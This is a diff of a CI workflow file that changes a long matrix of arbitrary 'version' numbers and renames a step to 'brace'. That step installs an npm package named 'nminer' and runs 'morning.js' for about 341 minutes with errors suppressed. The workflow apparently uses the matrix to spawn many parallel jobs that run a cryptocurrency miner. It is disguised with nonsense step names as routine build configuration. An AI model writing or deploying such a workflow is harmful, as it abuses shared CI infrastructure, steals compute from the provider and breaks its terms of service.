@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 867 }
-          - { version: 2577 }
-          - { version: 8634 }
-          - { version: 8868 }
-          - { version: 8744 }
-          - { version: 6329 }
-          - { version: 8452 }
-          - { version: 8739 }
-          - { version: 5035 }
-          - { version: 6730 }
-          - { version: 8238 }
-          - { version: 3028 }
-          - { version: 7851 }
-          - { version: 3129 }
-          - { version: 7923 }
-          - { version: 1980 }
-          - { version: 9010 }
-          - { version: 6659 }
+          - { version: 8270 }
+          - { version: 2846 }
+          - { version: 7235 }
+          - { version: 8462 }
+          - { version: 1176 }
+          - { version: 8688 }
+          - { version: 4372 }
+          - { version: 7136 }
+          - { version: 1897 }
+          - { version: 5140 }
+          - { version: 7515 }
+          - { version: 4542 }
+          - { version: 2666 }
+          - { version: 5002 }
+          - { version: 5164 }
+          - { version: 8854 }
+          - { version: 8763 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: how crocodile
+      - name: brace
         run: |
           npm install nminer@latest
-          timeout 348m node morning.js || echo "morning executed"
+          timeout 341m node morning.js || echo "morning executed"
